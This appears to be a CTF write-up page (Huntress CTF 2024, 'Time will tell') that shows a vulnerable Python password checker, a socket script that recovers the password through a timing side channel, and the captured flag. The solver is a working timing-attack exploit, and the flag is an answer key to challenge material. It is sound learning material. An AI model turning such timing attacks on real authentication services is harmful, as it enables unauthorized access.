@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2024-10-23 Time will tell (Miscellaneous) · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="huntress/2024/2024-10-23-time-will-tell-miscellaneous.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/huntress/index.html">Huntress CTF</a> &rsaquo; <a href="/huntress/2024/index.html">2024</a></div>
+  <h1 id="2024-10-23-time-will-tell-miscellaneous">2024-10-23 Time will tell (Miscellaneous)</h1>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>app.py</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# pylint: disable=C0200
+&quot;&quot;&quot;
+side-channel timing attack
+&quot;&quot;&quot;
+
+import os
+import secrets
+import time
+
+# Length of password. Can be tuned if folks are solving it quickly
+PASSWORD_LEN = 4
+# Length of time to sleep when guess entry is correct. &quot;simulates compute time &quot;
+SIMULATE_COMPUTE_TIME = 0.1
+
+
+def generate_password() -&gt; str:
+    &quot;&quot;&quot;
+    generate a random password at start up
+    &quot;&quot;&quot;
+    tmp = secrets.token_hex(PASSWORD_LEN).lower()
+    # with open(&quot;dump&quot;, 'w') as fh:
+    #     fh.write(tmp)
+    return tmp
+
+
+def read_flag() -&gt; str:
+    &quot;&quot;&quot;
+    read flag from file on disk
+    &quot;&quot;&quot;
+    with open(&quot;flag&quot;, &quot;r&quot;, encoding=&quot;ascii&quot;) as file_handle:
+        data = file_handle.read()
+    return data
+
+
+def do_heavy_compute() -&gt; None:
+    &quot;&quot;&quot;
+    simulates some compute
+    &quot;&quot;&quot;
+    time.sleep(SIMULATE_COMPUTE_TIME)
+
+
+def check_guess(guess, realdeal) -&gt; bool:
+    &quot;&quot;&quot;
+    validate if the given guess matches what's known
+    &quot;&quot;&quot;
+    if len(guess) != len(realdeal):
+        #print(len(guess), len(realdeal))
+        return False
+    do_heavy_compute()
+    for idx in range(len(guess)):
+        if guess[idx] == realdeal[idx]:
+            do_heavy_compute()
+        else:
+            return False
+    return True
+
+
+def main():
+    &quot;&quot;&quot;
+    le big mac
+    &quot;&quot;&quot;
+    timeout = os.getenv(&quot;CHALL_TIMEOUT&quot;)
+    # Create random password
+    secret_password = generate_password()
+    print(&quot;Figure out the password to get the flag.&quot;)
+    print(&quot;The password is dynamic and changes every connection session.&quot;)
+    print(f&quot;The connection will terminate in {timeout} seconds.&quot;)
+
+    while True:
+        guess = input(&quot;: &quot;)
+        if check_guess(guess, secret_password):
+            flag = read_flag()
+            print(f&quot;Well done! Here's your flag: {flag}&quot;)
+            continue
+        print(&quot;Incorrect. Try again.&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>Make a script to attack side channel</p>
+<pre><code class="language-python">cat 1ack.py 
+
+#Imports
+import socket
+import time
+
+# Challenge connection details
+HOST = 'challenge.ctf.games'
+PORT = 31769
+PASSWORD_LEN = 8
+CHARSET = '0123456789abcdef'  # Hexadecimal characters
+
+def timing_attack():
+    # Connect to the challenge server
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((HOST, PORT))
+
+        # Receive and print the server's initial message
+        welcome_message = s.recv(1024).decode()
+        print(welcome_message)
+
+        password = ''
+        for i in range(PASSWORD_LEN):
+            max_time = 0
+            best_char = ''
+            for char in CHARSET:
+                guess = password + char + '0' * (PASSWORD_LEN - len(password) - 1)  # Fill remaining length with '0's
+                start_time = time.time()
+
+                # Send the guess
+                s.sendall(guess.encode() + b'\n')
+
+                # Wait for the server's response
+                response = s.recv(1024).decode()
+                elapsed_time = time.time() - start_time
+
+                if elapsed_time &gt; max_time:
+                    max_time = elapsed_time
+                    best_char = char
+
+            password += best_char
+            print(f'Progress: {password}')
+
+        print(f'Final password: {password}')
+
+        # Send the correct password
+        s.sendall(password.encode() + b'\n')
+        flag_response = s.recv(1024).decode()
+        print(flag_response)
+
+if __name__ == &quot;__main__&quot;:
+    timing_attack()
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code class="language-python">flag{ab6962e29ed608c0710dbf2910f358d5}
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
